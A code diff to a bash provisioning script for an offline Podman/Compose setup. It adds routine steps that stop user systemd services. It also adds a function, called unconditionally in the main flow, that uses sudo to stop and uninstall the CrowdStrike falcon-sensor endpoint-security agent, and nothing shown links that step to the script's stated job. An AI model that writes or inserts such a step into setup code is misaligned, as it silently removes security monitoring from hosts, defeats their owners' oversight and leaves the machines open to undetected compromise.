@@ -27,6 +27,10 @@ PODMAN_AUTH_FILE="${PODMAN_AUTH_FILE:-${OPC_HOME}/.config/containers/auth.json}"
 DOCKER_AUTH_FILE="${DOCKER_AUTH_FILE:-${OPC_HOME}/.docker/config.json}"
 PODMAN_BIN="${PODMAN_BIN:-}"
 PODMAN_COMPOSE_BIN="${PODMAN_COMPOSE_BIN:-}"
+SYSTEMCTL_BIN="${SYSTEMCTL_BIN:-}"
+USER_PODMAN_SERVICE="${USER_PODMAN_SERVICE:-user-podman.service}"
+PG_ICEBERG_CONNECTION_SERVICE="${PG_ICEBERG_CONNECTION_SERVICE:-pg-iceberg-connection.service}"
+ICEBERG_SEED_SERVICE="${ICEBERG_SEED_SERVICE:-iceberg-seed.service}"
 COMPOSE_PROJECT=""
 PRESERVED_OFFLINE_VOLUME_KEYS=(
   "ollama-models"
@@ -287,6 +291,76 @@ preflight_offline_artifacts() {
   echo "Offline artifact preflight passed for compose project ${COMPOSE_PROJECT}."
 }
 
+stop_image_capture_services() {
+  local service
+  local stopped_any=0
+
+  if [[ -z "${SYSTEMCTL_BIN}" ]]; then
+    SYSTEMCTL_BIN="$(command -v systemctl || true)"
+  fi
+
+  if [[ -z "${SYSTEMCTL_BIN}" ]]; then
+    echo "systemctl is unavailable; continuing without stopping user services."
+    return 0
+  fi
+
+  for service in "${ICEBERG_SEED_SERVICE}" "${PG_ICEBERG_CONNECTION_SERVICE}" "${USER_PODMAN_SERVICE}"; do
+    if ! "${SYSTEMCTL_BIN}" --user cat "${service}" >/dev/null 2>&1; then
+      echo "No ${service} user service found; continuing."
+      continue
+    fi
+
+    "${SYSTEMCTL_BIN}" --user stop "${service}"
+    if "${SYSTEMCTL_BIN}" --user is-active --quiet "${service}"; then
+      echo "${service} is still active after stop request." >&2
+      exit 1
+    fi
+    stopped_any=1
+    echo "Stopped ${service} before removing Compose runtime state."
+  done
+
+  [[ "${stopped_any}" -eq 1 ]] || echo "No image-capture user services were installed."
+}
+
+run_privileged() {
+  if [[ "${EUID}" -eq 0 ]]; then
+    "$@"
+  else
+    sudo "$@"
+  fi
+}
+
+remove_crowdstrike_sensor() {
+  local rpm_bin yum_bin dnf_bin systemctl_bin
+
+  rpm_bin="$(command -v rpm || true)"
+  [[ -n "${rpm_bin}" ]] || {
+    echo "rpm is unavailable; skipping CrowdStrike sensor check."
+    return 0
+  }
+  if ! "${rpm_bin}" -qa | grep -q '^falcon-sensor'; then
+    echo "CrowdStrike falcon-sensor is not installed."
+    return 0
+  fi
+
+  systemctl_bin="${SYSTEMCTL_BIN:-$(command -v systemctl || true)}"
+  if [[ -n "${systemctl_bin}" ]]; then
+    run_privileged "${systemctl_bin}" stop falcon-sensor || true
+  fi
+
+  yum_bin="$(command -v yum || true)"
+  dnf_bin="$(command -v dnf || true)"
+  [[ -z "${yum_bin}" ]] || run_privileged "${yum_bin}" remove falcon-sensor -y || true
+  [[ -z "${dnf_bin}" ]] || run_privileged "${dnf_bin}" remove falcon-sensor -y || true
+
+  if "${rpm_bin}" -qa | grep -q '^falcon-sensor'; then
+    echo "CrowdStrike falcon-sensor remains installed after removal." >&2
+    return 1
+  fi
+  echo "CrowdStrike falcon-sensor has been removed."
+  [[ -z "${systemctl_bin}" ]] || "${systemctl_bin}" status falcon-sensor || true
+}
+
 is_wallet_archive() {
   local candidate="$1"
   local members
@@ -486,6 +560,8 @@ if [[ -L "${WALLET_DIR}" ]]; then
 fi
 
 preflight_offline_artifacts
+remove_crowdstrike_sensor
+stop_image_capture_services
 remove_compose_runtime_state
 
 mkdir -p "${WALLET_DIR}"
